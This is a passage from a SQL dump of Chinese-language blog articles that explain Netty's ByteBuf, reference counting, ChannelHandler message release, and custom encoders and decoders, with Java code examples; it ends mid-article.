可写字节区域是指:[writerIndex, capacity)之间的区域。任何名称以write开头的操作方法都将改变writerIndex的值。\n3. 如果write操作参数是一个ByteBuf的话,并且没有指定目标指针索引,那么被指定的ByteBuf的readIndex也会相应的改变\n4. 如果没有足够的字节可以写入的话,就会出现IndexOutOfBoundsException,对于新分配的ByteBuf的writeIndex默认值是0,而对于包装或者拷贝的ByteBuf的writeIndex值则是ByteBuf的capacity\n\n### ByteBuf方法\n#### discardReadBytes方法\n```java\n   BEFORE discardReadBytes()\n \n       +-------------------+------------------+------------------+\n       | discardable bytes |  readable bytes  |  writable bytes  |\n       +-------------------+------------------+------------------+\n       |                   |                  |                  |\n       0      <=      readerIndex   <=   writerIndex    <=    capacity\n \n \n   AFTER discardReadBytes()\n \n       +------------------+--------------------------------------+\n       |  readable bytes  |    writable bytes (got more space)   |\n       +------------------+--------------------------------------+\n       |                  |                                      |\n  readerIndex (0) <= writerIndex (decreased)        <=        capacity\n```\n1. 目的是为了回收以读取使用的空间,这样可写入的字节就更多了\n1. discardReadBytes(): 将可读字节区域(CONTENT)[readerIndex, writerIndex)往前移动*readerIndex*位，同时修改readerIndex和writerIndex 。\n2. discardReadBytes()方法会移动可读字节区域内容(CONTENT)。如果频繁调用，会有多次数据复制开销，对性能有一定的影响\n3. 当调用discardableByte()后,中间readable bytes内容实际上会发生一次数据的复制过程,会把数据复制到最开头的位置上,复制后,之前readable bytes内容实际上就变成了可写入的内容区域\n\n#### clear方法\n```java\n   BEFORE clear()\n \n       +-------------------+------------------+------------------+\n       | discardable bytes |  readable bytes  |  writable bytes  |\n       +-------------------+------------------+------------------+\n       |                   |                  |                  |\n       0      <=      readerIndex   <=   writerIndex    <=    capacity\n \n \n   AFTER clear()\n \n       +---------------------------------------------------------+\n       |             writable bytes (got more space)             |\n       +---------------------------------------------------------+\n       |                                                         |\n       0 = readerIndex = writerIndex            <=            capacity\n```\n1. 你可以通过调用clear将readerIndex与writerIndex置为0\n2. 它只会将两个指针置为0,并不会将缓冲区内容清除,注意这个语义和Java Nio中ByteBuffer的clear()语义是不一样的\n\n#### 搜索操作\n```java\n	ByteBuf buffer = Unpooled.buffer(); //get reference form somewhere\n    // 使用indexOf()方法来查找\n    buffer.indexOf(buffer.readerIndex(), buffer.writerIndex(), (byte)8);\n    // 使用ByteProcessor查找给定的值\n    int index = buffer.forEachByte(ByteProcessor.FIND_CR);\n```\n\n1. 对于简单的单字节搜索，请使用indexOf（int，int，byte）和bytesBefore（int，int，byte)\n2. bytesBefore（byte）}在处理 NUL终止字符串时特别有用\n3. 对于复杂的搜索，使用forEachByte（int，int，ByteProcessor）和ByteProcessor实施\n\n#### mark和reset\n1. 每个缓冲区中有两个标记索引;一个是存储readerIndex,一个存储writerIndex\n2. 通过调用mark和reset方法对两个索引进行记录与回溯,但这个mark并没有readlimit\n3. 当用户调用mark(readlimit)方法设置标记后，如果readlimit小于缓存buf的大小，则只有读取超过buf.size大小字节后，mark标记才会失效；如果readlimit大于缓存buf的大小，则只有读取超过readlimit大小字节后，mark标记才会失效. 也就是说只有读取的字节数 > Math.max(readlimit,buf,size)后，mark标记才会失效。当然这只是BufferedInputSteam类的算法。无法确保其它输入流也是如此算法。所以为确保mark标记的有效，最好将读取的字节数限定在readlimit以内\n\n#### 缓冲区视图拷贝\n```java\nduplicate()\nslice()\nslice(int, int)\nreadSlice(int)\nretainedDuplicate()\nretainedSlice()\nretainedSlice(int, int)\nreadRetainedSlice(int)\nreadRetainedSlice(int)\n```\n1. 派生缓冲区为ByteBuf提供了一个访问的视图。视图仅仅提供一种访问操作，不做任何拷贝操作。下列方法，都会呈现给使用者一个视图，以供访问\n2. 上面的6中方法，都会返回一个新的ByteBuf实例，具有自己的读索引和写索引。但是，其内部存储是与原对象是共享的。这就是视图的概念,这是一种浅拷贝\n3.  请注意：如果你修改了这个新的ByteBuf实例的具体内容，那么对应的源实例也会被修改，因为其内部存储是共享的\n4. 如果需要拷贝现有缓冲区的真实副本，请使用copy()或copy(int, int)方法来完成深拷贝。\n5. 使用派生缓冲区视图，避免了复制内存的开销，有效提高程序的性能\n\n#### 绝对操作与相对操作\n1. get()和set()开头的绝对操作: 从给定的索引开始，并且*保持索引不变*\n2. read()和write()开头的相对操作: 从给定的索引开始，并且*根据已经访问过的字节数对索引进行访问*\n\n### ByteBuf类型\n#### HeapBuffer 堆缓冲区\n1. 这是最常用的类型,ByteBuf将数据存储到JVM的堆空间中,并且将实际的数据存放到byte array中来实现\n2. 优点: 由于数据是存储在JVM的堆中,因此可以快速的创建与快速的释放,并且它提供了直接访问内部字节数组的方法\n3. 缺点: 每次读写数据时,都需要将数据复制到直接缓冲区中,再进行网络传输.\n4. 对于后端的业务消息的编解码来说,推荐使用HeapByteBuf\n\n#### DirectBuffer 直接缓冲区\n1. 在堆之外直接分配内存空间,直接缓冲区并不会占用堆的容量空间,因为它是由操作系统在本地内存进行的数据分配\n2. 优点: 在使用Socket进行数据传递时,性能非常好,因为数据直接位于操作系统的本地内存中,所以不需要从JVM将数据复制到直接缓冲区中\n3. 缺点: 因为DirectBuffer是直接在操作系统内存中,所以内存空间的分配与释放要比堆空间更加复杂,而且速度要慢一些,Netty通过提供内存池来解决这个问题,直接缓冲区并不支持通过字节数组的方式来访问数据\n4. 对于I/O通信线程在读写缓冲区时,推荐使用DirectByteBuf\n\n#### CompositeBuffer(复合缓冲区)\n```java\npublic static void main(String[] args) {\n        CompositeByteBuf compositeByteBuf = Unpooled.compositeBuffer();\n        ByteBuf heapBuf = Unpooled.buffer(10);\n        ByteBuf directBuf = Unpooled.directBuffer(10);\n\n        compositeByteBuf.addComponents(heapBuf, directBuf);\n        // compositeByteBuf.removeComponent(0);\n        Iterator<ByteBuf> iter = compositeByteBuf.iterator();\n        while (iter.hasNext()) {\n            System.out.println(iter.next());\n        }\n        compositeByteBuf.forEach(System.out::println);\n} \n```\n1. 一个虚拟缓冲区，它将多个缓冲区显示为单个合并缓冲区。\n2. 它是一种容器,这个容器里面可以存放其他缓冲区\n3. 在一些需要拆分合并缓冲区场景会起到作用,作用场景类似于JavaNIO中的Scattering与Gathering\n\n#### 三种类型与JDK的转换\n```java\n// ByteBuf有三种类型,HeapBuffer(通过字节数组维护),DirectBuffer和CompositeBuffer\n\n// 字节数组\n// 如果一个ByteBuf是由一个字节数组来维护的话,你就可以直接通过array()方法来去访问它的数组\n// 要想确定ByteBuf是否由一个字节数组维护的话通过hasArray()方法就可以知道\n\n// 如果一个ByteBuf是可以转换成NIO的ByteBuffer的话,那么你可以调用nioBuffer()来实现\n\n// ByteBuf提供了toString(Charset)方法,来将ByteBuf转换成字符串,toString方法会接收一个Charset字符集\n// 注意不带参数的toString()方法并不是一个转换方法\n\npublic static void main(String[] args) throws Exception {\n        byte[] content = \"Hello world 你好\".getBytes(\"utf-8\");\n\n        ByteBuf byteBuf1 = Unpooled.buffer(512);\n        byteBuf1.writeBytes(content);\n        System.out.println(byteBuf1.hasArray()); // true\n        System.out.println(byteBuf1.isDirect()); // false\n        System.out.println(byteBuf1.array()); // 不会报错\n        System.out.println(byteBuf1.nioBuffer()); // java.nio.HeapByteBuffer[pos=0 lim=18 cap=18]\n        System.out.println(byteBuf1.toString(Charset.forName(\"utf-8\")));// Hello world 你好\n\n        ByteBuf byteBuf2 = Unpooled.directBuffer(512);\n        byteBuf2.writeBytes(content);\n        System.out.println(byteBuf2.hasArray()); // false\n        System.out.println(byteBuf2.isDirect()); // true\n        // System.out.println(byteBuf2.array()); // 将会报错,抛出java.lang.UnsupportedOperationException\n        System.out.println(byteBuf2.nioBuffer()); // java.nio.DirectByteBuffer[pos=0 lim=18 cap=18]\n        System.out.println(byteBuf2.toString(Charset.forName(\"utf-8\")));// Hello world 你好\n\n        CompositeByteBuf compositeByteBuf = Unpooled.compositeBuffer();\n        compositeByteBuf.addComponents(byteBuf1, byteBuf2);\n        System.out.println(compositeByteBuf.hasArray()); // false\n        System.out.println(compositeByteBuf.isDirect()); // false\n        // System.out.println(compositeByteBuf.array()); // 将会报错,抛出java.lang.UnsupportedOperationException\n        System.out.println(compositeByteBuf.nioBuffer()); // java.nio.HeapByteBuffer[pos=0 lim=18 cap=18]\n        System.out.println(compositeByteBuf.toString(Charset.forName(\"utf-8\")));// 没有内容\n        Iterator<ByteBuf> iter = compositeByteBuf.iterator();\n        while (iter.hasNext()) {\n            // UnpooledByteBufAllocator$InstrumentedUnpooledUnsafeHeapByteBuf(ridx: 0, widx: 18, cap: 512))\n            // UnpooledByteBufAllocator$InstrumentedUnpooledUnsafeNoCleanerDirectByteBuf(ridx: 0, widx: 18, cap: 512))\n            System.out.println(iter.next());\n        }\n        compositeByteBuf.forEach(byteBuf -> {\n            System.out.println(byteBuf.toString(Charset.forName(\"utf-8\")));// Hello world 你好\n        });\n    }\n```\n### AdaptiveRecvByteBufAllocator\n1. RecvByteBufferAllocator会根据反馈,它会自动增加以及减少的buffer大小\n2. 上一次读取的字节数已经完全填满了字节数组的话,那么它会优雅地自动增加期望可读的字节量,相当于自动增加缓冲区的大小\n3. 如果读操作连续两次并没有填充满字节数组,它也会优雅地减少可期望可读的字节数.否则它会保持相同的预测\n4. 它本身会基于前一次读的字节数量以及之前所分配的字节缓冲区大小,两者之间进行比对,根据前一次比对的结果,自动调节分配的大小\n5. AdaptiveRecvByteBufAllocator(): 创建一个预测器,期望缓冲区大小是从1024开始的,但是不会低于64也不会高于65536\n6. sizeTable-静态代码块中进行了初始化,目标是设定好可分配的缓冲区大小,决定下一次分配缓冲区的多少,取决sizeTable中每一个元素值是什么申请buffer直接内存,如果是系统允许的话\n\n### 总结\n#### JDK的ByteBuffer的缺点\n1. final byte[] hb; 这是JDK的ByteBuffer对象用于存储数据的对象声明,可以看到,其字节数组是被声明final的,也就是长度固定不变的,一旦分配好后不能动态扩容与收缩;而且当待存储的数据字节很大时就很有可能出现IndexOutOfBoundException.如果要预防这个异常,那就需要在存储之前完全确定好待存储的字节大小.如果ByteBuffer的空间不足,我们只有一种解决方案,创建一个全新的ByteBuffer对象,然后再将之前的ByteBuffer中的数据复制过去,这一切操作都需要由开发者自己来手动完成.\n2. ByteBuffer只使用一个position指针来标识位置信息,在进行读写切换时就需要调用*flip方法或是rewind方法*,使用起来不方便\n\n#### Netty的ByteBuf的优点\n1. 存储字节的数组是动态的,其最大值默认是Integer.MAX_VALUE,这里的动态性是体现在write方法中的,write方法在执行时会判断buffer容器大小,如果不足则*自动扩容*\n2. Netty的ByteBuf采用了*读写索引分离的策略(readerIndex与writerIndex)*,一个初始化(里面尚未有任何数据)的ByteBuf的readerIndex与writerIndex值都为0', 0, 0, 34, 0, 0, '2019-09-15 11:03:21', '2019-09-17 22:28:54', 0, 0);
INSERT INTO `article` VALUES (84, 1, 'Netty的引用计数机制', '2019/9/1568551559_mmexport1568451185122.jpg', '### ReferenceCounted概述\n#### ReferenceCounted是什么\n1. 这是一个引用计数的对象,需要显式的去回收取消分配\n2. 当一个新的ReferenceCounted被实例化之后,它会将其引用计数初始化为1,*retain()*会增加引用计数+1,而*release()*会减少引用计数-1\n3. 当引用计数被降低为0调用*deallocate()*具体实现根据缓冲区类型,对象将会显式的取消分配回收,回收之后我门访问所有已经被回收的对象,都会导致访问的错误,抛出IllegalReferenceCountException\n4. 如果实现ReferenceCounted的对象是其他实现ReferenceCounted 的对象的容器,*当外层容器的引用计数变为0时候,里面包含的对象也将通过release()释放*\n\n#### ReferenceCounted方法\n1. *refCnt()*: 返回这个对象的引用计数数值,如果是0的话,表示这个对象已经被回收掉了\n2. *ratain()*: 将这个对象的引用计数+1\n3. *ratain(int)*: 将这个对象的引用计数添加传入的数量	\n4. *touch()*: 记录此对象的当前访问位置以进行调试,如果确定此对象已内存泄露,则将向您提供此操作记录的信息通过ResourceLeakDetector,此方法是touch(Object) touch(null)的快捷方式\n5. *release()*: 将这个对象的引用计数-1,当引用计数值已经到达0的话,就回收这个对象\n6. *release(int)*: 将这个对象的引用计数减少传入的数量,当引用计数值已经到达0的话,就回收这个对象\n\n### AbstractReferenceCountedByteBuf\n![rerCntUpdater1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568552435_rerCntUpdater1.png)\n![rerCntUpdater2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568552436_rerCntUpdater2.png)\n1. 一个抽象的基类,实现了ReferenceCounted,针对于使用*引用计数的ByteBuf的实现*\n2. retain(): *使用自旋锁+cas机制修改计数值*\n3. 引用计数实现在refCount的这个属性使用了*AtomicIntegerFieldUpdate*和*cas*\n4. Netty的引用计数计数器本身基于*AtomicIntegerFieldUpdate*\n5. 关于引用计数,每一个ByteBuf它的引用计数初始值就是1,当每次调用retain()会增加引用计数+1,而release()会减少引用计数-1,当引用计数被降低为0,这时这个ByteBuf对象就不能再去被使用了\n\n#### AtomicIntegerFieldUpdate\n1. 更新器更新的必须是int类型变量,不能是其包装类型\n2. 更新器更新的必须是volatile类型变量,确保线程之间共享变量时的立刻可见性,禁止重排序\n3. 变量不能是static的,必须要是实例变量.因为Unsafe.objectFieldOffset()方法不支持静态变量(CAS操作本质上是通过对象实例的偏移量来直接进行赋值)\n4. 更新器只能修改它可见范围内的变量,因为更新器是通过反射来得到这个变量,如果变量不可见就会报错\n\n#### 为什么不使用原始的AtomicInteger\n1. 是因为ByteBuf对象是用的非常多的,如果每个对象都有一层AtomicInteger对int的包装的话,会导致开销会大一些,使用AtomicIntegerFieldUpdate全局只有一个静态的变量,一个变量就可以维护所有的,这是一种高效的做法\n\n### 引用计数\n#### 关于引用计数\n1. 从Netty版本4开始,某些对象的生命周期是由它们的引用计数来进行管理的,这样的话Netty就可以将其返回到一个对象池里面垃圾回收和资源队列没有提供对于不可达的这样一种有效实时的保证\n2. 引用计数就提供了另一种解决方案,它的代价就是用起来不是很方便,因为对于Java开发者来说,早已习惯了对象只需创建无需回收.然而对于引用计数领域来说,你需要时刻的想清楚考虑到引用计数到底是多少,什么时候把它引用计数+1或-1\n3. ByteBuf是最值得注意的一种类型,它充分利用了引用计数来去改进分配和回收的性能\n\n#### 创建引用计数对象\n```java\nByteBuf buf = ctx.alloc().directBuffer();\nassert buf.refCnt() == 1;\n```\n1. 新创建基于引用计数的对象,它的初始的引用计数值就是1\n\n\n\n#### 减少引用计数值\n```java\nassert buf.refCnt() == 1;\n// release() returns true only if the reference count becomes 0.\nboolean destroyed = buf.release();\nassert destroyed;\nassert buf.refCnt() == 0;\n```\n1. 当你释放引用计数的时候,它的引用计数值就会-1,如果引用计数值到达了0的话,引用计数对象就会被回收掉,或者返回到它所来自于的那个对象池当中,这取决于ByteBuf是否是池化的\n\n\n\n#### 访问已释放的引用计数对象\n```java\nassert buf.refCnt() == 0;\ntry {\n  buf.writeLong(0xdeadbeef);\n  throw new Error(\"should not reach here\");\n} catch (IllegalReferenceCountExeception e) {\n  // Expected\n}\n```\n1. 我们尝试去访问引用计数值为0的引用计数对象就会触发一个IllegalReferenceCountException异常\n\n\n#### 增加引用计数值\n```java \nByteBuf buf = ctx.alloc().directBuffer();\nassert buf.refCnt() == 1;\n\nbuf.retain();\nassert buf.refCnt() == 2;\n\nboolean destroyed = buf.release();\nassert !destroyed;\nassert buf.refCnt() == 1;\n```\n1. 增加引用计数,引用计数可以实现retain()这个操作去进行增加,前提是它没有被销毁\n\n#### 谁来销毁引用计数对象\n```java\npublic ByteBuf a(ByteBuf input) {\n    input.writeByte(42);\n    return input;\n}\n\npublic ByteBuf b(ByteBuf input) {\n    try {\n        output = input.alloc().directBuffer(input.readableBytes() + 1);\n        output.writeBytes(input);\n        output.writeByte(42);\n        return output;\n    } finally {\n        input.release();\n    }\n}\n\npublic void c(ByteBuf input) {\n    System.out.println(input);\n    input.release();\n}\n\npublic void main() {\n    ...\n    ByteBuf buf = ...;\n    // This will print buf to System.out and destroy it.\n    c(b(a(buf)));\n    assert buf.refCnt() == 0;\n} \n\nAction						Who should release?	          Who released?\n1. main() creates buf	           buf→main()	\n2. main() calls a() with buf	    buf→a()	\n3. a() returns buf merely.	      buf→main()	\n4. main() calls b() with buf	    buf→b() 	\n5. b() returns the copy of buf	  buf→b(),copy→main()	b() releases buf\n6. main() calls c() with copy	   copy→c()  	 \n7. c() swallows copy	            copy→c()	       c() releases copy\n```\n1. 谁最后访问引用计数对象,最后访问的对象那一方它来负责引用计数对象的销毁,更为具体的\n2. 如果一个组件期待着传递一个引用计数对象向另一个组件,相当于发送方向接受方传递了一个引用计数对象,发送方通常是不需要销毁它的,而是将这个决策交给了接收方来决定\n3. 如果一个组件消费了一个引用计数对象,并且它知道没有其他的组件再去访问这个引用计数对象了,那么这个组件就应该销毁这个引用计数对象\n\n#### 衍生的Buffer视图\n```java\nByteBuf parent = ctx.alloc().directBuffer();\nByteBuf derived = parent.duplicate();\n\n// Creating a derived buffer does not increase the reference count.\nassert parent.refCnt() == 1;\nassert derived.refCnt() == 1;\n```\n1. ByteBuf的duplicate(),slice()以及order()等方法来创建一个衍生的Buffer,衍生的Buffer会跟它的原始Buffer共享同一个内容区域\n*衍生下来的Buffer并没有自己的引用计数,而是共享原始Buffer的引用计数*\n\n```java\nByteBuf parent = ctx.alloc().directBuffer(512);\nparent.writeBytes(...);\n\ntry {\n    while (parent.isReadable(16)) {\n        ByteBuf derived = parent.readSlice(16);\n        derived.retain();\n        process(derived);\n    }\n} finally {\n    parent.release();\n}\n...\n\npublic void process(ByteBuf buf) {\n    ...\n    buf.release();\n}\n```\n1. 请注意,原始Buffer和衍生Buffer会共享相同的引用计数,而引用计数当衍生Buffer被创建时并不会增加,因此,*当你将要把一个衍生Buffer传递到应用其他的组件时候,你需要首先调用一个retain()方法*\n2. *ByteBuf的copy(),readBytes(int)等方法并不是衍生的Buffer*,它们直接把内存重新拷贝了一份,因此这种情况下,所返回来的ByteBuf有自己的引用计数器,是需要被释放的\n\n### ChannelHandler的引用计数\n#### 入栈消息\n```java\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    ByteBuf buf = (ByteBuf) msg;\n    try {\n        ...\n    } finally {\n        buf.release();\n    }\n}\n```\n1. 当一个事件循环将数据读取到一个ByteBuf对象,然后触发了channelRead()事件时候,应该是由ChannelPipeline中相应的ChannelHandle来去释放相应的Buffer对象,*因此消费接收数据的这个ChannelHandler应该在它的channelRead()当中释放ByteBuf对象.谁最后使用ByteBuf对象,谁就应该调用release()方法进行释放*\n\n```java\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    ByteBuf buf = (ByteBuf) msg;\n    ...\n    ctx.fireChannelRead(buf);\n}\n```\n1. 如果ChannelHandler将这个Buffer对象传递给了下一个ChannelHandler,那么就不需要去释放它\n\n```java\n// Assuming your handler is placed next to `HttpRequestDecoder`\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    if (msg instanceof HttpRequest) {\n        HttpRequest req = (HttpRequest) msg;\n        ...\n    }\n    if (msg instanceof HttpContent) {\n        HttpContent content = (HttpContent) msg;\n        try {\n            ...\n        } finally {\n            content.release();\n        }\n    }\n}\n```\n1. 请注意,ByteBuf并不是Netty中唯一的引用计数类型,如果你正在处理由decoder生成的消息的话,msg很有可能也是引用计数类型的\n\n```java\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    try {\n        ...\n    } finally {\n        ReferenceCountUtil.release(msg);\n    }\n}\n```\n1. 如果你搞不清楚,简化释放消息的过程,那么你可以使用ReferenceConUtil.release();\n2. 此外你应该去考虑使用*SimpleChannelHandler,它会对接收到的所有消息调用release()方法*\n\n#### 出栈消息\n```java\n// Simple-pass through\npublic void write(ChannelHandlerContext ctx, Object message, ChannelPromise promise) {\n    System.err.println(\"Writing: \" + message);\n    ctx.write(message, promise);\n}\n\n// Transformation\npublic void write(ChannelHandlerContext ctx, Object message, ChannelPromise promise) {\n    if (message instanceof HttpContent) {\n        // Transform HttpContent to ByteBuf.\n        HttpContent content = (HttpContent) message;\n        try {\n            ByteBuf transformed = ctx.alloc().buffer();\n            ....\n            ctx.write(transformed, promise);\n        } finally {\n            content.release();\n        }\n    } else {\n        // Pass non-HttpContent through.\n        ctx.write(message, promise);\n    }\n}\n```\n1. 与入栈消息不同的是,出栈消息是由应用所创建的,因此这是由Netty来负责写完之后释放消息,然而拦截写请求的处理器也应该确保释放中间的一些对象\n\n### SimpleChannelInboundHandler\n#### 与ChannelInboundHandler不同\n![simpleChannelInboundHandlerChannelRead.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568636701_simpleChannelInboundHandlerChannelRead.png)\n```java\n	@Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        ctx.channel().writeAndFlush(msg); // 将会被释放,导致失效\n    }\n```\n1. 本身是一个ChannelInboundHandleAdapter,它允许让我们的显式的处理特定类型的消息\n2. 注意构造方法参数的不同,它会释放已经处理的消息(通过将这些消息传递给ReferenceCountUtil.release)注意构造方法参数的不同,它会释放已经处理的消息(通过将这些消息传递给ReferenceCountUtil.release)\n3. 如果你想要将消息传递给下一个处理器的话,这个时候需要通过使用ReferenceCountUtil.retain(object)\n4. 因为会释放资源,我们不要存储这个消息的引用,因为这个引用会失效,netty会把这个资源释放掉\n\n#### 两种发送消息方式的不同\n```java\n	@Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        System.out.println(ctx.channel().remoteAddress() + \",\" + msg);\n        ctx.channel().writeAndFlush(\"from server: \" + UUID.randomUUID());\n        ctx.writeAndFlush(\"from server: \" + UUID.randomUUID());\n    }\n```\n![ctxWriteAndFlush.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568636700_ctxWriteAndFlush.png)\n1. 在netty中有两种发送消息的方式,可以直接写到channel中,也可以写到与channelHandler所关联的那个ChannelHandleContext中\n2. 对于*ctx.channel().writeAndFlush()*来说,消息会从ChannelPipeline的末尾开始流动\n3. 对于*ctx.writeAndFlush()*来说,消息将从ChannelPipeline中的下一个channelHandle开始流动\n4. 因此Channel与ChannelHandlerContext里面拥有很多同名同语义的方法,它们的*作用域实际上是不一样的*\n\n#### 使用建议\n1. ChannelHandlerContext与ChannelHandler之间的关联绑定关系是永远都不会发送改变的,因此对其进行缓存是没有任何问题的\n2. 对于与Channel的同名方法来说,ChannelHandlerContext的方法将产生更短的事件流,所以我们应该在可能的情况下利用这个特性来提升应用性能\n3. *在channelRead0方法中,我们应该使用自己定义的业务线程池,防止对Netty的EventLoop的IO线程进行阻塞*\n\n### DefaultChannelPipeline释放资源\n#### AbstractNioByteChannel\n![AbstractNioByteChannelRead.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568555325_AbstractNioByteChannelRead.png)\n1. 将从客户端接收过来的数据转换成ByteBuf对象,read(),往ChannelPipeline后面不断传递	\n\n#### TailContext\n![tailContextUserEventTriggered.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568555325_tailContextUserEventTriggered.png)\n1. DefaultChannelPipeline的内部类\n2. 整个入栈处理器的最后一个,它显然需要进行一些资源的释放\n3. userEventTriggered()方法当中调用了ReferenceCountUtil.release(evt);\n\n#### HeaderContext\n![ChannelOutboundBuffeRemove.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568555325_ChannelOutboundBuffeRemove.png)\n1. DefaultChannelPipeline的内部类\n2. 整个出栈处理器的最后一个,它显然需要进行一些资源的释放\n3. flush()方法当中unsafe.flush()把引用计数对象释放\n4. 最终在ChannelOutboundBuffer的remove()方法中进行释放\n\n> 参考文献https://netty.io/wiki/reference-counted-objects.html', 0, 0, 36, 0, 0, '2019-09-15 20:46:08', '2019-09-16 20:29:08', 0, 0);
INSERT INTO `article` VALUES (85, 1, 'Netty的自定义编解码器与解决粘包拆包', '2019/9/1568608331_mmexport1568527413195.jpg', '### Netty的ChannelHandler重要概念\n1. Netty的处理器可以分为两类: 入栈处理器与出栈处理器\n2. 入栈处理器的顶层接口是*ChannelInboundHandler*,出栈处理器的顶层接口是*ChannelOutboundHandler*\n3.  数据处理器常用的各种编解码器本质上都是处理器\n4. 编解码器: 无论我们向网络中写入的数据是什么类型(int,char,String,二进制等等),数据在网络中传递时,其都是以字节流的形式呈现的:*将数据由原本的形式转换为字节流的操作称为编码(encode)*,*将数据由字节转换为它原本的格式或是其他格式的操作称为解码(decode)*,编解码统一称为codec\n5. 编码: 本质上是一种出栈处理器;因此,编码一定是一种ChannelOutboundHandler\n6. 解码: 本质上是一种入栈处理器;因此,解码一定是一种ChannelInboundHandler\n7. 在Netty中,编码器通过以XXXEncoder命名,解码器通常以XXXDecoder命名\n\n### ByteToMessageDecoder\n#### ByteToMessageDecoder概述\n```java\npublic class MyByteToLongDecoder extends ByteToMessageDecoder {\n	// ctx: 编解码器本质上是ChannelHandler,这是该解码器所对应的ChannelHandlerContext\n	// in: 从其中开始读取数据的ByteBuf,需要解码的数据来自于ByteBuf\n	// out: 从in中读取数据开始解析,然后把解析的结果放到out当中\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {\n    \n	}\n}\n```\n\n1. *ByteToMessageDecoder*是netty提供的最基础的字节到消息的解码器,它本身是一个*ChannelInboundHandlerAdapter*\n2. 它会已类似流的方式将ByteBuf解码成另外一种消息类型(*AbstractNioByteChannel*会将从客户端接收过来的Byte转换成ByteBuf对象,在read()方法,往ChannelPipeline后面不断传递)\n2. 该类为我们做了大量工作,我们只需实现一个抽象方法*decode(..)*\n3. *decode(ChannelHandlerContext, ByteBuf, List)*: 对其进行解码,将一个ByteBuf解码成另外一种类型,这个方法会被持续的调用,直到返回的时候输入的ByteBuf无法读取,或者从输入的ByteBuf中什么也读不到 \n\n#### 注意问题\n1. 如果你要自定义解码器,你就需要非常小心地去实现ByteToMessageDecoder\n2. 请确保在ByteBuf当中有足够的字节作为一个*完整的帧*(比如int占4个字节,如果直接readInt()的话,可能Buffer里只有3个字节,这样就不构成4个字节,因此这就是不完整的帧),你可以用*ByteBuf.readableBytes()*来检查判断.\n3. 如果不构成一个完整的帧,就直接返回,且不要去修改*readIndex*,从而让更多的字节到达\n4. 要想检查一个完整的帧且不修改readIndex,请使用根据索引的绝对操作方法*ByteBuf.getInt(int)*;绝对方法指的是不会改变索引值的方法\n5. 当使用诸如*ByteBuf.getInt(int)*这样的方法时候,你必须使用读索引的方式去处理,比如调用*in.getInt(0)*这个方法就假设这个帧是从Buffer的起始位置开始的;但实际情况往往不是这个样子的,因此应该使用*in.getInt(in.readerIndex())*,因为在过程中起始位置未必就是0这个位置\n6. 请注意,*ByteToMessageDecoder*的子类不可以被标记为*Sharable注解*;Sharable注解标识ChannelHandler相同的实例可以多次添加到一个或多个ChannelPipeline,如果未指定此注解,每次将它添加到管道实例时,你必须创建新的ChannelHandler实例\n7. 一些方法,比如说*ByteBuf.readBytes(int)*如果返回的Buffer没有被释放或者被添加到out list当中会导致内存泄漏;这种情况下,应该使用衍生Buffer,比如ByteBuf.readSlice(int)这样的方法来避免内存泄漏\n\n#### decodeLast\n1. *当ChannelHandlerContext*处于活跃状态时最后一次调用。这意味着触发了*ChannelInactive*,随后进入不活跃状态\n2. 默认情况下，这只会调用*decode()*,但在特殊情况(http情况)下子类可能会覆盖*decodeLast()*进行某些特殊的清理操作\n3. https://github.com/netty/netty/issues/4386\n\n#### 自定义解码器\n```java\npublic class MyByteToLongDecoder extends ByteToMessageDecoder {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {\n        if (in.readableBytes() >= 8) {\n            // 可以读取一个long,long是8字节\n            // 判断必须要有,可以构造一个完整的帧\n            out.add(in.readLong());\n        }\n    }\n}\n```\n### MessageToByteEncoder\n#### MessageToByteEncoder概述\n```java\npublic class IntegerEncoder extends MessageToByteEncoder<Integer> {\n    @Override\n    protected void encode(ChannelHandlerContext ctx, Long msg, ByteBuf out) throws Exception {\n	// 把Integer写出到了ByteBuf当中\n        out.writeInt(msg)\n    }\n}\n```\n1. *MessageToByteEncoder*是netty提供的最基础的消息到字节的编码器,它本身是一个*ChannelOutboundHandlerAdapter*\n2. 它会已类似流的方式将消息转换成ByteBuf,比如将Integer转换为ByteBuf\n3. 泛型I表示我们要将什么类型的数据给转换成ByteBuf,换句话说就是原类型,这里的原类型就是Integer\n4. 该类为我们做了大量工作,我们只需实现一个抽象方法*encode(..)*\n5. *encode(ChannelHandlerContext, Long, ByteBuf)*: 当消息是这个编码器可以处理的消息时,这个方法会被调用.\n6. *encode(ChannelHandlerContext, Long, ByteBuf)*的调用前提是通过*TypeParameterMatcher*的校验匹配;比如需要编码的是Integer,而传进来的是String.那么就不会进行调用,因为类型不匹配\n\n#### 自定义编码器\n```java\npublic class MyLongToByteEncoder extends MessageToByteEncoder<Long> {\n    @Override\n    protected void encode(ChannelHandlerContext ctx, Long msg, ByteBuf out) throws Exception {\n        out.writeLong(msg);\n    }\n}\n```\n\n### ReplayingDecoder\n#### ReplayingDecoder概述\n```java\n// 使用ReplayingDecoder,不需要检查消息类型字节完整\npublic class MyByteToLongDecoder extends ReplayingDecoder<Void> {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {\n        out.add(in.readLong());\n    }\n}\n```\n1. 它本身继承了ByteToMessageDecoder,相比ByteToMessageDecoder更加易用\n2. 泛型S通过表示Enum或Void,如果不需要状态管理的话使用Void\n\n#### ReplayingDecoder作用\n```java\n// 内容分为两个部分,前部分为head,后部分为body\n// head: 为一个int,内容是body的长度\n// body: 真正的内容\n// 先获取head得到内容长度,再获取内容\n\n// 使用ByteToMessageDecoder实现,那么将会较为复杂\npublic class IntegerHeaderFrameDecoder extends ByteToMessageDecoder {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf buf, List<Object> out) throws Exception {\n        if 